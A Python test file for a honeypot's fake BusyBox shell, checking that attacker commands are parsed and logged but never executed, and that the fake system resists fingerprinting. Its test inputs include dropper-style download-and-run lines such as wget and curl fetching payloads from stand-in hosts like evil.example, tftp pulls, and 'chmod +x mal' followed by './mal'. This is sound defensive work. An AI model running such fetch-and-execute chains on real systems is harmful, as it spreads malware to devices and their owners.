"""Tests for the fake shell dispatcher (honeypot/shell/commands.py).

Focus: download commands are *parsed*, never executed; execution-attempt
commands are acknowledged without ever mutating the fake filesystem's
permission model (it has none) or touching the real filesystem.
"""
from __future__ import annotations

from honeypot.config.schema import PersonaConfig
from honeypot.shell.commands import dispatch
from honeypot.shell.filesystem import FakeFilesystem


def _fs() -> FakeFilesystem:
    return FakeFilesystem(PersonaConfig(arch="riscv64"))


def test_wget_is_parsed_not_executed():
    result = dispatch("wget http://1.2.3.4/mal.riscv64 -O mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.protocol == "http"
    assert result.download_request.url == "http://1.2.3.4/mal.riscv64"
    assert result.download_request.requested_filename == "mal"


def test_wget_without_explicit_output_uses_url_basename():
    result = dispatch("wget http://evil.example/payload.bin", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request.requested_filename == "payload.bin"


def test_busybox_wget_prefix_is_unwrapped():
    result = dispatch("busybox wget http://evil.example/x.bin", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.url == "http://evil.example/x.bin"


def test_curl_is_parsed():
    result = dispatch("curl -o out.bin http://evil.example/x", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request.requested_filename == "out.bin"


def test_tftp_get_is_parsed():
    result = dispatch("tftp -g -r payload.bin 10.0.0.1", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.protocol == "tftp"
    assert result.download_request.requested_filename == "payload.bin"


def test_chmod_plus_x_is_acknowledged_but_logged_as_execution_attempt():
    result = dispatch("chmod +x mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""
    assert result.execution_attempt is not None
    assert "chmod" in result.execution_attempt


def test_dotslash_execution_is_acknowledged_and_logged():
    result = dispatch("./mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""
    assert result.execution_attempt == "./mal"


def test_sh_execution_is_logged():
    result = dispatch("sh mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.execution_attempt == "sh mal"


def test_bare_ash_does_not_report_not_found():
    # ash is advertised in the busybox applet list (ls /bin, busybox
    # --list) and is the name of the shell you're already in -- it must
    # not be the one listed applet that fails to run.
    result = dispatch("ash", _fs(), PersonaConfig(arch="riscv64"))
    assert "not found" not in result.output
    assert result.execution_attempt == "ash"


def test_unknown_command_returns_busybox_style_error():
    result = dispatch("frobnicate --now", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == "-ash: frobnicate: not found"


def test_uname_a_reflects_persona():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    result = dispatch("uname -a", fs, persona)
    assert "riscv64" in result.output
    assert persona.hostname in result.output


def test_whoami_and_id_reflect_the_logged_in_username():
    # Real single-account embedded devices don't have per-user separation
    # (any accepted login is effectively root), but the *name* shown must
    # still track who actually logged in -- hardcoding "root" regardless
    # of that, while the prompt shows the real username, was a one-command
    # honeypot tell.
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    assert dispatch("whoami", fs, persona, "admin").output == "admin"
    assert dispatch("id", fs, persona, "admin").output == "uid=0(admin) gid=0(admin) groups=0(admin)"


def test_whoami_and_id_default_to_root_when_username_unknown():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    assert dispatch("whoami", fs, persona).output == "root"
    assert dispatch("id", fs, persona).output == "uid=0(root) gid=0(root) groups=0(root)"


def test_cd_ls_pwd_roundtrip():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    assert dispatch("cd /etc", fs, persona).output == ""
    assert dispatch("pwd", fs, persona).output == "/etc"
    listing = dispatch("ls", fs, persona).output
    assert "os-release" in listing


def test_cat_missing_file_reports_error_without_raising():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    result = dispatch("cat /nope", fs, persona)
    assert "No such file" in result.output


def test_mkdir_touch_rm_echo_roundtrip():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("mkdir /tmp/x", fs, persona)
    assert fs.is_dir("/tmp/x")
    dispatch("touch /tmp/x/f", fs, persona)
    assert fs.exists("/tmp/x/f")
    dispatch("echo hi > /tmp/x/f", fs, persona)
    assert fs.read_file("/tmp/x/f") == "hi\n"
    dispatch("rm /tmp/x/f", fs, persona)
    assert not fs.exists("/tmp/x/f")


def test_exit_sets_exit_session_flag():
    result = dispatch("exit", _fs(), PersonaConfig(arch="riscv64"))
    assert result.exit_session is True


# -- --help behavior ---------------------------------------------------

def test_help_flag_returns_busybox_style_text_for_ls():
    result = dispatch("ls --help", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.startswith("Usage: ls ")
    assert "-l" in result.output


def test_help_flag_for_wget_shows_usage_instead_of_attempting_download():
    result = dispatch("wget --help", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is None
    assert result.output.startswith("Usage: wget")


def test_help_flag_for_chmod_shows_usage_not_execution_attempt():
    result = dispatch("chmod --help", _fs(), PersonaConfig(arch="riscv64"))
    assert result.execution_attempt is None
    assert result.output.startswith("Usage: chmod")


def test_cd_help_falls_through_to_real_chdir_error():
    """cd is a pure ash builtin with no --help of its own in real BusyBox --
    `cd --help` genuinely tries to chdir into a directory named "--help"."""
    result = dispatch("cd --help", _fs(), PersonaConfig(arch="riscv64"))
    assert "--help" in result.output
    assert "No such file or directory" in result.output


# -- ls flags ------------------------------------------------------------

def test_ls_dash_l_long_format_shows_applets_as_symlinks_to_busybox():
    # Real BusyBox: one real ELF (busybox), every applet a symlink to it --
    # not each applet as its own separate "executable" file (a one-command
    # honeypot tell: cat'ing/sizing an applet should show busybox's content,
    # not placeholder text at a suspiciously uniform tiny size).
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    result = dispatch("ls -l /bin", fs, persona)
    lines = result.output.splitlines()
    wget_line = next(l for l in lines if l.endswith(" wget -> busybox"))
    assert wget_line.startswith("lrwxrwxrwx")
    busybox_line = next(l for l in lines if l.endswith(" busybox") and "->" not in l)
    assert busybox_line.startswith("-rwxr-xr-x")


def test_cat_on_bin_applet_shows_busybox_content_not_placeholder_text():
    # cat/hashing a /bin binary is one of the most common dropper checks
    # before it trusts a host -- neither the applet nor busybox itself
    # should print readable placeholder English.
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    wget_content = dispatch("cat /bin/wget", fs, persona).output
    busybox_content = dispatch("cat /bin/busybox", fs, persona).output
    assert wget_content == busybox_content  # wget is a symlink to busybox
    assert "busybox applet" not in wget_content
    assert "ELF executable" not in wget_content
    assert wget_content.startswith("\x7fELF")


def test_ls_dash_a_shows_dot_and_dotdot():
    result = dispatch("ls -a", _fs(), PersonaConfig(arch="riscv64"))
    entries = result.output.split("  ")
    assert entries[0] == "."
    assert entries[1] == ".."


def test_ls_dash_1_one_entry_per_line():
    result = dispatch("ls -1 /bin", _fs(), PersonaConfig(arch="riscv64"))
    assert "\n" in result.output
    assert "  " not in result.output


def test_ls_combined_flags_la():
    result = dispatch("ls -la /bin", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.splitlines()[0].startswith("drwxr-xr-x")  # the "." entry


# -- cp / mv ---------------------------------------------------------------

def test_cp_copies_file_content():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo hello > /tmp/src", fs, persona)
    result = dispatch("cp /tmp/src /tmp/dst", fs, persona)
    assert result.output == ""
    assert fs.read_file("/tmp/dst") == "hello\n"
    assert fs.read_file("/tmp/src") == "hello\n"  # source untouched


def test_cp_missing_operand():
    result = dispatch("cp onlyone", _fs(), PersonaConfig(arch="riscv64"))
    assert "missing file operand" in result.output


def test_cp_nonexistent_source_errors():
    result = dispatch("cp /nope /tmp/x", _fs(), PersonaConfig(arch="riscv64"))
    assert "cannot stat" in result.output


def test_mv_moves_and_removes_source():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo hi > /tmp/a", fs, persona)
    dispatch("mv /tmp/a /tmp/b", fs, persona)
    assert fs.read_file("/tmp/b") == "hi\n"
    assert not fs.exists("/tmp/a")


def test_mv_missing_source_errors():
    result = dispatch("mv /nope /tmp/x", _fs(), PersonaConfig(arch="riscv64"))
    assert "can't stat" in result.output


# -- grep --------------------------------------------------------------

def test_grep_literal_match():
    result = dispatch("grep root /etc/passwd", _fs(), PersonaConfig(arch="riscv64"))
    assert "root" in result.output


def test_grep_case_insensitive():
    result = dispatch("grep -i ROOT /etc/passwd", _fs(), PersonaConfig(arch="riscv64"))
    assert "root" in result.output


def test_grep_invert_match():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo one > /tmp/f", fs, persona)
    result = dispatch("grep -v nomatch /tmp/f", fs, persona)
    assert "one" in result.output


def test_grep_pattern_with_regex_metacharacters_is_treated_literally():
    """Safety property: '.' etc. must not behave as a regex wildcard --
    grep here is substring matching only, never a compiled regex engine
    fed by attacker input (ReDoS avoidance, see _grep_matches)."""
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo 'a.b' > /tmp/f", fs, persona)
    result = dispatch("grep a.b /tmp/f", fs, persona)
    assert "a.b" in result.output
    result_no_match = dispatch("grep axb /tmp/f", fs, persona)
    assert result_no_match.output == ""  # would match if '.' were a real regex wildcard


def test_grep_missing_file():
    result = dispatch("grep root /nope", _fs(), PersonaConfig(arch="riscv64"))
    assert "No such file or directory" in result.output


# -- sed -----------------------------------------------------------------

def test_sed_simple_substitution():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo hello > /tmp/f", fs, persona)
    result = dispatch("sed s/hello/goodbye/ /tmp/f", fs, persona)
    assert result.output == "goodbye"
    assert fs.read_file("/tmp/f") == "hello\n"  # no -i: source untouched


def test_sed_global_flag_replaces_all_occurrences():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo aaa > /tmp/f", fs, persona)
    result = dispatch("sed s/a/b/g /tmp/f", fs, persona)
    assert result.output == "bbb"


def test_sed_without_global_flag_replaces_first_only():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo aaa > /tmp/f", fs, persona)
    result = dispatch("sed s/a/b/ /tmp/f", fs, persona)
    assert result.output == "baa"


# -- awk -----------------------------------------------------------------

def test_awk_print_field():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo one two three > /tmp/f", fs, persona)
    result = dispatch("awk '{print $2}' /tmp/f", fs, persona)
    assert result.output == "two"


def test_awk_unsupported_program_shape_is_a_safe_noop():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("echo hi > /tmp/f", fs, persona)
    result = dispatch("awk 'BEGIN{print \"pwned\"}' /tmp/f", fs, persona)
    assert result.output == ""


# -- networking / misc applets -------------------------------------------

def test_ifconfig_lists_interfaces():
    result = dispatch("ifconfig", _fs(), PersonaConfig(arch="riscv64"))
    assert "eth0" in result.output
    assert "lo" in result.output


def test_ip_a_lists_interfaces():
    result = dispatch("ip a", _fs(), PersonaConfig(arch="riscv64"))
    assert "eth0" in result.output


def test_ip_bare_shows_usage():
    result = dispatch("ip", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.startswith("Usage: ip")


def test_ping_produces_requested_reply_count():
    result = dispatch("ping -c 2 1.2.3.4", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.count("64 bytes from") == 2
    assert "2 packets transmitted" in result.output


def test_top_shows_a_plausible_snapshot():
    result = dispatch("top", _fs(), PersonaConfig(arch="riscv64"))
    assert "Mem:" in result.output
    assert "COMMAND" in result.output


def test_etc_issue_matches_the_telnet_pre_login_banner():
    # /etc/issue is conventionally exactly what getty prints before login
    # on a real system -- a dropper comparing what it saw pre-login
    # against `cat /etc/issue` post-login must never catch these two
    # contradicting each other.
    persona = PersonaConfig(arch="riscv64", telnet_banner="SiFive RISC-V Linux (buildroot)\nlogin: ")
    fs = FakeFilesystem(persona)
    assert dispatch("cat /etc/issue", fs, persona).output == "SiFive RISC-V Linux (buildroot)"


def test_proc_uptime_and_loadavg_exist_and_are_well_formed():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    uptime = dispatch("cat /proc/uptime", fs, persona).output
    up, idle = uptime.split()
    assert float(up) > 0
    assert float(idle) > 0

    loadavg = dispatch("cat /proc/loadavg", fs, persona).output
    assert len(loadavg.split()) == 5


def test_proc_uptime_shows_as_zero_byte_file_like_a_real_proc_entry():
    result = dispatch("ls -l /proc", _fs(), PersonaConfig(arch="riscv64"))
    uptime_line = next(l for l in result.output.splitlines() if l.endswith(" uptime"))
    assert uptime_line.startswith("-r--r--r--")
    assert uptime_line.split()[4] == "0"


def test_vi_silently_no_ops():
    result = dispatch("vi /etc/passwd", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""
    assert result.execution_attempt is None


def test_mount_bare_shows_fake_table():
    result = dispatch("mount", _fs(), PersonaConfig(arch="riscv64"))
    assert "squashfs" in result.output


def test_mount_with_args_is_a_silent_noop():
    result = dispatch("mount /dev/sda1 /mnt", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""


# -- bare `busybox` invocation --------------------------------------------

def test_busybox_bare_shows_banner_and_function_list():
    result = dispatch("busybox", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.startswith("BusyBox v")
    assert "Currently defined functions:" in result.output
    assert "wget" in result.output


def test_busybox_help_shows_same_banner_not_unknown_command():
    result = dispatch("busybox --help", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output.startswith("BusyBox v")


def test_busybox_list_prints_one_applet_per_line():
    result = dispatch("busybox --list", _fs(), PersonaConfig(arch="riscv64"))
    lines = result.output.splitlines()
    assert "wget" in lines
    assert "ls" in lines


def test_busybox_list_full_prints_paths():
    result = dispatch("busybox --list-full", _fs(), PersonaConfig(arch="riscv64"))
    assert "/bin/wget" in result.output.splitlines()


def test_busybox_applet_unwrap_still_works():
    result = dispatch("busybox wget http://evil.example/x", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.url == "http://evil.example/x"
